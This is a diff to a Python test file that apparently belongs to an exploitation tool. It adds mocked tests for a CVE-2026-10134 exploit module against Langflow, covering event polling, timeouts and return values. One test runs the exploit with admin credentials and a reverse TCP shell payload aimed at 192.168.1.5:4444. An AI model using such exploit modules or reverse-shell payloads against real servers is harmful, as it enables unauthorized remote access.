@@ -51,6 +51,14 @@ class TestPollEvents:
         ):
             assert exploit._poll_events(base_url=_BASE_URL, job_id="job-1") is True
 
+    def test_returns_true_on_end_vertex_event(self):
+        exploit = Exploit()
+        with patch(
+            "flowhound.vulnerabilities.exploits.cve_2026_10134.get",
+            return_value=_iter_resp({"event": "end_vertex"}),
+        ):
+            assert exploit._poll_events(base_url=_BASE_URL, job_id="job-1") is True
+
     def test_returns_false_on_error_event(self):
         exploit = Exploit()
         with patch(
@@ -98,6 +106,28 @@ class TestPollEvents:
             return_value=_iter_resp({"event": "progress"}),
         ):
             assert exploit._poll_events(base_url=_BASE_URL, job_id="job-1") is None
+
+    def test_blocking_uses_infinite_read_timeout(self):
+        exploit = Exploit()
+        with patch(
+            "flowhound.vulnerabilities.exploits.cve_2026_10134.get",
+            return_value=_iter_resp({"event": "end"}),
+        ) as mock_get:
+            exploit._poll_events(base_url=_BASE_URL, job_id="job-1", blocking=True)
+        timeout_arg = mock_get.call_args.kwargs["timeout"]
+        assert isinstance(timeout_arg, tuple)
+        connect_t, read_t = timeout_arg
+        assert connect_t == exploit.TIMEOUT
+        assert read_t is None
+
+    def test_non_blocking_uses_scalar_timeout(self):
+        exploit = Exploit()
+        with patch(
+            "flowhound.vulnerabilities.exploits.cve_2026_10134.get",
+            return_value=_iter_resp({"event": "end"}),
+        ) as mock_get:
+            exploit._poll_events(base_url=_BASE_URL, job_id="job-1", blocking=False)
+        assert mock_get.call_args.kwargs["timeout"] == exploit.TIMEOUT
 
 
 # ---------------------------------------------------------------------------
@@ -308,8 +338,8 @@ class TestExploit:
                 is True
             )
 
-    def test_no_poll_events_still_returns_true(self):
-        """exploit() always returns True after cleanup regardless of poll result."""
+    def test_poll_failure_returns_false(self):
+        """exploit() returns False when _poll_events yields no terminal event."""
         poll_resp = MagicMock()
         poll_resp.iter_lines.return_value = iter([])
         exploit = Exploit()
@@ -336,5 +366,43 @@ class TestExploit:
         ):
             assert (
                 exploit.exploit(base_url=_BASE_URL, username="admin", password="secret")
-                is True
+                is False
             )
+
+    def test_blocking_payload_returns_true_on_end_event(self):
+        """A blocking payload that fires (end event received) returns True."""
+        from flowhound.vulnerabilities.payloads.reverse_tcp_shell import (
+            Payload as ShellPayload,
+        )
+
+        poll_resp = MagicMock()
+        poll_resp.iter_lines.return_value = iter([_json.dumps({"event": "end"})])
+        exploit = Exploit()
+        with (
+            patch(
+                "flowhound.vulnerabilities.clients.langflow.post",
+                return_value=_mock_auth_post(),
+            ),
+            patch(
+                "flowhound.vulnerabilities.exploits.cve_2026_10134.post",
+                side_effect=[
+                    _mock_resp(201, {"id": "flow-1"}),
+                    _mock_resp(200, {"job_id": "job-1"}),
+                ],
+            ),
+            patch(
+                "flowhound.vulnerabilities.exploits.cve_2026_10134.get",
+                return_value=poll_resp,
+            ),
+            patch(
+                "flowhound.vulnerabilities.exploits.cve_2026_10134.delete",
+                return_value=_mock_resp(200),
+            ),
+        ):
+            result = exploit.exploit(
+                base_url=_BASE_URL,
+                username="admin",
+                password="secret",
+                payload=ShellPayload(lhost="192.168.1.5", lport=4444),
+            )
+        assert result is True
